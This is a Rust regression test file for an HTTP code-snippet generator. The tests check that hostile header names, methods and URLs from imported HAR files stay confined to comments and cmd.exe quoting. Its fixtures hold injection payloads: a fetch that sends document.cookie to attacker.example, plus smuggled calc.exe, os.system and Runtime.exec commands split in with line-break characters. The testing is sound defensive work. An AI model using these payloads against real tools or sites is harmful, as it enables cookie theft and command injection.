//! Regression tests: captured data from imported HAR / `.akev` files (which, unlike live
//! traffic, can hold any characters) must never turn into code in a generated snippet.
//!
//! * `Note:` comments embed header names, header values and methods: a line break (in any
//!   language's sense) must not end the comment.
//! * cmd.exe quoting must never emit a raw CR (or other control characters): cmd deletes CRs
//!   before handling carets, so `^` + CR + `^&` became `^^&` — an unescaped `&`.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use akev_codegen::{SnippetRequest, Target, generate, parse_curl};
use akev_core::Headers;
use bytes::Bytes;

fn request(method: &str, headers: &[(&str, &str)], body: Option<&[u8]>) -> SnippetRequest {
    let mut h = Headers::new();
    for (k, v) in headers {
        h.append(*k, *v);
    }
    SnippetRequest {
        method: method.into(),
        url: "https://example.com/a".into(),
        headers: h,
        body: body.map(Bytes::copy_from_slice),
    }
}

/// Characters that end a line comment in at least one target language.
const LINE_BREAKS: [char; 7] = [
    '\n', '\r', '\u{b}', '\u{c}', '\u{85}', '\u{2028}', '\u{2029}',
];

/// Every line holding `marker` must be a comment line (start with `comment`), and no comment
/// line may hold a line break character of any target language.
fn assert_confined_to_comments(code: &str, marker: &str, comment: &str, target: Target) {
    assert!(
        code.contains(marker),
        "{target:?}: payload missing:\n{code}"
    );
    // Split on every line terminator any language knows, so a U+2028 counts as a new line.
    for line in code.split(|c| LINE_BREAKS.contains(&c)) {
        if line.contains(marker) && line.contains("Note:") {
            assert!(
                line.trim_start().starts_with(comment),
                "{target:?}: payload escaped the comment: {line:?}\n{code}"
            );
        }
    }
    for line in code.lines().filter(|l| l.trim_start().starts_with(comment)) {
        assert!(
            !line.contains(|c: char| LINE_BREAKS.contains(&c) || c.is_control() && c != '\t'),
            "{target:?}: control character in comment {line:?}"
        );
    }
}

const PAYLOAD: &str = "fetch('https://attacker.example/?c='+document.cookie)//";

#[test]
fn forbidden_header_names_stay_in_the_fetch_note() {
    for brk in LINE_BREAKS {
        let name = format!("Sec-Fetch-Mode{brk}{PAYLOAD}");
        let req = request("GET", &[(name.as_str(), "cors")], None);
        let code = generate(Target::JsFetch, &req);
        assert_confined_to_comments(&code, "attacker.example", "//", Target::JsFetch);
        assert!(!code.contains(brk) || brk == '\n', "{brk:?} in output");
    }
}

#[test]
fn non_ascii_header_notes_stay_comments() {
    let name = format!("X-Note\nStart-Process calc.exe\n#\u{2028}{PAYLOAD}");
    let req = request("GET", &[(name.as_str(), "café")], None);
    for (target, comment) in [
        (Target::Powershell, "#"),
        (Target::JavaHttpClient, "//"),
        (Target::DartHttp, "//"),
        (Target::JsFetch, "//"),
        (Target::NodeFetch, "//"),
    ] {
        let code = generate(target, &req);
        if code.contains("Note:") && code.contains("calc.exe") {
            assert_confined_to_comments(&code, "calc.exe", comment, target);
        }
    }
    let code = generate(Target::Powershell, &req);
    assert!(
        !code
            .lines()
            .any(|l| l.trim_start().starts_with("Start-Process")),
        "{code}"
    );
}

#[test]
fn java_unicode_escapes_cannot_end_the_note() {
    // javac decodes `\u000a` into a line break before lexing, comments included.
    let name = r"X-A\u000aRuntime.getRuntime().exec(new String[]{});//";
    let req = request("GET", &[(name, "é")], None);
    let code = generate(Target::JavaHttpClient, &req);
    let note = code
        .lines()
        .find(|l| l.contains("Note:"))
        .expect("non-ASCII note");
    assert!(note.contains(r"X-A\\u000aRuntime"), "{note}");
    assert!(!note.contains(r"A\u000a"), "{note}");
}

#[test]
fn host_and_method_notes_stay_comments() {
    // Node fetch: the Host value; U+2028/U+2029 are JavaScript line terminators.
    for brk in LINE_BREAKS {
        let host = format!("evil.example{brk}{PAYLOAD}");
        let req = request("GET", &[("Host", host.as_str())], None);
        let code = generate(Target::NodeFetch, &req);
        assert_confined_to_comments(&code, "attacker.example", "//", Target::NodeFetch);
    }
    // Python: the method (mixed case gets a note).
    let method = "Purge\u{85}import os; os.system('id')#";
    let req = request(method, &[], None);
    for target in [Target::PythonRequests, Target::PythonHttpx] {
        let code = generate(target, &req);
        assert_confined_to_comments(&code, "os.system", "#", target);
    }
    // Wget: names of empty-valued headers.
    let name = format!("X-Empty\n{PAYLOAD}");
    let req = request("GET", &[(name.as_str(), "")], None);
    let code = generate(Target::Wget, &req);
    assert_confined_to_comments(&code, "attacker.example", "#", Target::Wget);
}

#[test]
fn curl_windows_never_emits_a_raw_cr() {
    let req = request(
        "GET",
        &[("X-Trace", "id\r& calc.exe & rem "), ("X-Z", "a\u{1a}b\0c")],
        None,
    );
    let code = generate(Target::CurlWindows, &req);
    assert!(
        !code.contains(['\r', '\u{1a}', '\0']),
        "control character in {code:?}"
    );
    assert!(code.starts_with("rem Note: cmd.exe can't pass control characters"));
    // Every `&` is still escaped: read back, it's one curl command with the header intact.
    let parsed = parse_curl(&code).unwrap();
    assert_eq!(parsed.url, "https://example.com/a");
    assert_eq!(parsed.headers.get("x-trace"), Some("id & calc.exe & rem"));
    assert_eq!(parsed.headers.get("x-z"), Some("a b c"));

    // The same for the URL and the method.
    let mut req = request("PURGE\r&calc", &[], None);
    req.url = "https://example.com/a?x=\r&calc.exe".into();
    let code = generate(Target::CurlWindows, &req);
    assert!(!code.contains('\r'), "{code:?}");
    let parsed = parse_curl(&code).unwrap();
    assert_eq!(parsed.url, "https://example.com/a?x= &calc.exe");
    assert_eq!(parsed.method, "PURGE &calc");

    // Clean requests are unchanged: no note.
    let clean = generate(Target::CurlWindows, &request("GET", &[("A", "b&c")], None));
    assert!(!clean.contains("rem "), "{clean}");
}
